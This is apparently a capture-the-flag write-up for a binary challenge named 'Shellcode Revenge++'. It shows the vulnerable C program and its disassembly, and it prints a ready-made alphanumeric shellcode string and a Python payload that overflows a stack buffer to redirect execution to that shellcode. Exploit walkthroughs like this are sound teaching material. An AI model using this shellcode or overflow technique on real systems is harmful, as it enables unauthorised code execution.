# Shellcode Revenge++

```C
int main(){
    setvbuf(stdout,0,2,0);
    puts( "Name always contain printable characters, isn't it?" );
    puts( "What'sssssss your name, ONLY contains [ 'a'~'z' 'A'~'Z' '0'~'9' ':' '>' '=' '<' '^' '/' '\\' '_'  ]:");

    len = __read_chk( 0 , name , 97 , 100 );
    if( len <= 0 ){
        puts("read error");
        _exit(1);
    }

    check( len );

    printf( "Hello %s! Leave some messege for me!" , name );
    char buf[0x10];
    read( 0 , buf , 0x20 );

    printf( "You said: %s" , buf );

    return 0;
}
```
Fron the name of this problem, we can know that it is another shellcode promble.

However, there's a `__read_chk` function, which checkes the length of our input, and a `check( len )` to check our shellcode.

```C
void check( len ){
    if( name[len - 1] == '\n' ) name[len - 1] = '\x00';
    int i;
    for( i = 0 ; i < len - 1 ; i++ ){
        if( ( name[i] < '/' || name[i] > '9' ) && 
		( name[i] < 'a' || name[i] > 'z' ) && 
		( name[i] < 'A' || name[i] > 'Z' ) &&  
		( name[i] < ';' || name[i] > '>' ) && 
		name[i] != '^' && name[i] != '_' && name[i] != '\\' ) {
            puts( "Your name contains unprintable characters!, are you hacker? GO AWAY!!!!!" );
            exit(0);
        }
    }
}
```

As what we see above, our shellcode is limited to a range `a ~ z` `A ~ Z` `; ~ >` `^` `_` `\` , which is a ASCII range.

According to what I found, though this problem has shorter solution, this is testeing on a concept of Alphanumeric Shellcode.

Also, this has something to do with encoding shellcode with XORs.

However, I am too lazy to write one and try out the XORs for encoding, I googled one that fits into the length checking.

https://www.exploit-db.com/exploits/35205/

	XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V

This will be our shellcode.

So, what we have to do is just input our shellcode and overwrite the return adress to our shellcode.

From `objdump`, we can see:

	400891:	b9 64 00 00 00       	mov    $0x64,%ecx
	400896:	ba 61 00 00 00       	mov    $0x61,%edx
	40089b:	be c0 10 60 00       	mov    $0x6010c0,%esi
	4008a0:	bf 00 00 00 00       	mov    $0x0,%edi
	4008a5:	b8 00 00 00 00       	mov    $0x0,%eax
	4008aa:	e8 21 fd ff ff       	callq  4005d0 <__read_chk@plt>
	
`read_chk` reads our shellcode to the address `0x6010c0` and our padding:

	4008f9:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
	4008fd:	ba 20 00 00 00       	mov    $0x20,%edx
	400902:	48 89 c6             	mov    %rax,%rsi
 	400905:	bf 00 00 00 00       	mov    $0x0,%edi
 	40090a:	b8 00 00 00 00       	mov    $0x0,%eax
  	40090f:	e8 ec fc ff ff       	callq  400600 <read@plt>

`read` reads our second input to `rbp-0x10`, and thus our padding will be 0x18 bytes.

Finally our payload will be:

```python
p.sendline(b"A"*0x18 + b"\xc0\x10\x60\x00" + b"\x00\x00\x00\x00")
```
